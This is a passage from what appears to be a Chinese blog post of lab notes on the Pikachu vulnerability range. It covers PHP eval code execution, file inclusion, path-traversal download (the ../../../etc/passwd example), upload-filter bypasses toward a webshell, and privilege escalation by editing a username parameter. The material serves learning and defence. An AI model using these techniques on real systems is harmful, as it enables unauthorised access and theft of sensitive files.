<h2 id="exec-“evel”"><a href="#exec-“evel”" class="headerlink" title="exec “evel”"></a>exec “evel”</h2><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210306155431470-796247682.png"
                      alt="img"
                ></p>
<p>可直接执行PHP代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo()；</span><br></pre></td></tr></table></figure>

<h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><blockquote>
<p>File Inclusion(文件包含漏洞)概述</p>
<p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：<br>include(),include_once()<br>require(),require_once()<br>这些文件包含函数，这些函数在代码设计中被经常使用到。</p>
<p>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：</p>
<p>1.本地文件包含漏洞：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。<br>2.远程文件包含漏洞：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。</p>
</blockquote>
<h2 id="附-4"><a href="#附-4" class="headerlink" title="附"></a>附</h2><p>文件包含：<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/dogecheng/p/11635220.html" >介绍<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="unsafe-filedownload"><a href="#unsafe-filedownload" class="headerlink" title="unsafe filedownload"></a>unsafe filedownload</h1><blockquote>
<p>不安全的文件下载概述</p>
<p>文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。</p>
<p>此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！</p>
</blockquote>
<h2 id="附-5"><a href="#附-5" class="headerlink" title="附"></a>附</h2><p>不安全文件下载：<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/dogecheng/p/11640389.html" >介绍<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="unsafe-upfileupload"><a href="#unsafe-upfileupload" class="headerlink" title="unsafe upfileupload"></a>unsafe upfileupload</h1><blockquote>
<p>不安全的文件上传漏洞概述</p>
<p>文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：</p>
<p>–验证文件类型、后缀名、大小;<br>–验证文件的上传方式;<br>–对文件进行一定复杂的重命名;<br>–不要暴露文件上传后的路径;<br>–等等…</p>
</blockquote>
<h2 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h2><p>删掉前端限制代码即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210306161528075-582635400.png"
                      alt="img"
                ></p>
<h2 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h2><p>上传时，通过BP修改文件后缀</p>
<h2 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210306162203876-941412136.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210306162242382-319825807.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210306162301362-1686481455.png"
                      alt="img"
                ></p>
<h2 id="附-6"><a href="#附-6" class="headerlink" title="附"></a>附</h2><p>不安全文件上传：<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/dogecheng/p/11640389.html" >详细<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="over-permission"><a href="#over-permission" class="headerlink" title="over permission"></a>over permission</h1><blockquote>
<p>概述</p>
<p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。因此，在在权限管理中应该遵守：<br>1.使用最小权限原则对用户进行赋权;<br>2.使用合理（严格）的权限校验规则;<br>3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;</p>
</blockquote>
<h2 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2><p>查看lucy账号信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210306212016619-1755608765.png"
                      alt="img"
                ></p>
<p>这里运用了GET 请求</p>
<p>将lucy改为lili</p>
<p>则可查看lili的信息</p>
<h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210306212329618-1836131637.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210306212350880-570401588.png"
                      alt="img"
                ></p>

        </div>

        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2021/SQL-SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">SQL-SQL注入基础</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2021/%E5%AF%B9XSS%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">对XSS的基础了解</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                            <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2020</span>&nbsp;-&nbsp;
            
            2021&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">BEACON</a>
        </div>
        
            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.1</a>
        </div>
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-number">1.</span> <span class="nav-text">暴力破解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-number">1.2.</span> <span class="nav-text">基于表单的暴力破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88on-server-%E4%B8%8E-on-client%EF%BC%89"><span class="nav-number">1.3.</span> <span class="nav-text">验证码绕过（on server 与 on client）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#token%E9%98%B2%E7%88%86%E7%A0%B4"><span class="nav-number">1.4.</span> <span class="nav-text">token防爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%84"><span class="nav-number">1.5.</span> <span class="nav-text">附</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Cross-Site-Scripting"><span class="nav-number">2.</span> <span class="nav-text">Cross-Site Scripting</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%EF%BC%88get%EF%BC%89"><span class="nav-number">2.1.</span> <span class="nav-text">反射型xss（get）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%EF%BC%88post%EF%BC%89"><span class="nav-number">2.2.</span> <span class="nav-text">反射型xss（post）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="nav-number">2.3.</span> <span class="nav-text">存储型XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM%E5%9E%8BXSS"><span class="nav-number">2.4.</span> <span class="nav-text">DOM型XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM%E5%9E%8BXSS-X"><span class="nav-number">2.5.</span> <span class="nav-text">DOM型XSS-X</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS%E4%B9%8B%E7%9B%B2%E6%89%93"><span class="nav-number">2.6.</span> <span class="nav-text">XSS之盲打</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8B%E8%BF%87%E6%BB%A4"><span class="nav-number">2.7.</span> <span class="nav-text">xss之过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%AC%E6%8D%A2"><span class="nav-number">2.7.1.</span> <span class="nav-text">转换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81"><span class="nav-number">2.7.2.</span> <span class="nav-text">编码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8Bhtmlspecialchars"><span class="nav-number">2.8.</span> <span class="nav-text">xss之htmlspecialchars</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8Bhref%E8%BE%93%E5%87%BA"><span class="nav-number">2.9.</span> <span class="nav-text">xss之href输出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8Bjs%E8%BE%93%E5%87%BA"><span class="nav-number">2.10.</span> <span class="nav-text">xss之js输出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%84-1"><span class="nav-number">2.11.</span> <span class="nav-text">附</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">2.11.1.</span> <span class="nav-text">XSS攻击流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B"><span class="nav-number">2.11.2.</span> <span class="nav-text">XSS攻击类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E5%BD%A2%E6%88%90%E5%8E%9F%E5%9B%A0"><span class="nav-number">2.11.3.</span> <span class="nav-text">XSS形成原因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="nav-number">2.11.4.</span> <span class="nav-text">XSS漏洞测试流程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CSRF"><span class="nav-number">3.</span> <span class="nav-text">CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-%E6%A6%82%E8%BF%B0"><span class="nav-number">3.0.1.</span> <span class="nav-text">CSRF(跨站请求伪造)概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%97%E4%B8%BE%E5%9C%BA%E6%99%AF"><span class="nav-number">3.0.2.</span> <span class="nav-text">列举场景</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF-get"><span class="nav-number">3.1.</span> <span class="nav-text">CSRF(get)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF-post"><span class="nav-number">3.2.</span> <span class="nav-text">CSRF(post)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF-token"><span class="nav-number">3.3.</span> <span class="nav-text">CSRF(token)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%84-2"><span class="nav-number">3.4.</span> <span class="nav-text">附</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0-1"><span class="nav-number">3.4.1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF%E6%94%BB%E5%87%BB%E9%9C%80%E8%A6%81%E6%9D%A1%E4%BB%B6"><span class="nav-number">3.4.2.</span> <span class="nav-text">CSRF攻击需要条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF%E5%92%8CXSS%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">3.4.3.</span> <span class="nav-text">CSRF和XSS的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E7%A1%AE%E8%AE%A4%E4%B8%80%E4%B8%AA%E7%9B%AE%E6%A0%87%E7%AB%99%E7%82%B9%E6%98%AF%E5%90%A6%E6%9C%89CSRF%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.4.4.</span> <span class="nav-text">如何确认一个目标站点是否有CSRF漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E6%8A%A4"><span class="nav-number">3.4.5.</span> <span class="nav-text">防护</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-inject"><span class="nav-number">4.</span> <span class="nav-text">SQL-inject</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%88post%EF%BC%89"><span class="nav-number">4.1.</span> <span class="nav-text">数字型注入（post）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%88get%EF%BC%89"><span class="nav-number">4.2.</span> <span class="nav-text">字符型注入（get）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">4.3.</span> <span class="nav-text">搜索型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xx%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">4.4.</span> <span class="nav-text">xx型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%9Cinsert-update%E2%80%9D%E6%B3%A8%E5%85%A5"><span class="nav-number">4.5.</span> <span class="nav-text">“insert&#x2F;update”注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%9Cdelete%E2%80%9D%E6%B3%A8%E5%85%A5"><span class="nav-number">4.6.</span> <span class="nav-text">“delete”注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%9Chttp-header%E2%80%9D%E6%B3%A8%E5%85%A5"><span class="nav-number">4.7.</span> <span class="nav-text">“http header”注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8%EF%BC%88base-on-boolian%EF%BC%89"><span class="nav-number">4.8.</span> <span class="nav-text">盲注（base on boolian）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8%EF%BC%88base-on-time%EF%BC%89"><span class="nav-number">4.9.</span> <span class="nav-text">盲注（base on time）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">4.10.</span> <span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%84-3"><span class="nav-number">4.11.</span> <span class="nav-text">附</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%91%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="nav-number">4.11.1.</span> <span class="nav-text">发生原因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">4.11.2.</span> <span class="nav-text">SQL注入攻击流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E7%B1%BB%E5%9E%8B"><span class="nav-number">4.11.3.</span> <span class="nav-text">注入点类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E4%B8%AD%E4%B8%89%E7%A7%8D%E6%B3%A8%E9%87%8A"><span class="nav-number">4.11.4.</span> <span class="nav-text">SQL中三种注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88updatexml%EF%BC%89"><span class="nav-number">4.11.5.</span> <span class="nav-text">基于函数报错注入（updatexml）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#updatexml"><span class="nav-number">4.11.6.</span> <span class="nav-text">updatexml()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#extractvalue"><span class="nav-number">4.11.7.</span> <span class="nav-text">extractvalue()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#floor"><span class="nav-number">4.11.8.</span> <span class="nav-text">floor()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RCE"><span class="nav-number">5.</span> <span class="nav-text">RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#exec-%E2%80%9Cping%E2%80%9D"><span class="nav-number">5.1.</span> <span class="nav-text">exec “ping”</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exec-%E2%80%9Cevel%E2%80%9D"><span class="nav-number">5.2.</span> <span class="nav-text">exec “evel”</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#File-Inclusion"><span class="nav-number">6.</span> <span class="nav-text">File Inclusion</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%84-4"><span class="nav-number">6.1.</span> <span class="nav-text">附</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#unsafe-filedownload"><span class="nav-number">7.</span> <span class="nav-text">unsafe filedownload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%84-5"><span class="nav-number">7.1.</span> <span class="nav-text">附</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#unsafe-upfileupload"><span class="nav-number">8.</span> <span class="nav-text">unsafe upfileupload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#client-check"><span class="nav-number">8.1.</span> <span class="nav-text">client check</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MIME-type"><span class="nav-number">8.2.</span> <span class="nav-text">MIME type</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getimagesize"><span class="nav-number">8.3.</span> <span class="nav-text">getimagesize</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%84-6"><span class="nav-number">8.4.</span> <span class="nav-text">附</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#over-permission"><span class="nav-number">9.</span> <span class="nav-text">over permission</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83"><span class="nav-number">9.1.</span> <span class="nav-text">水平越权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83"><span class="nav-number">9.2.</span> <span class="nav-text">垂直越权</span></a></li></ol></li></ol>
    </div>
</div>
        </aside>
    

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/dark-light-toggle.js"></script>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/code-copy.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/lazyload.js"></script>


<div class="post-scripts pjax">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/toc.js"></script>
    
</div>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/libs/pjax.min.js"></script>
<script>
    window.addEventListener('DOMContentLoaded', () => {
        const pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            KEEP.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            KEEP.utils.pjaxProgressBarEnd();
            pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            KEEP.refresh();
        });
    });
</script>



</body>
</html>
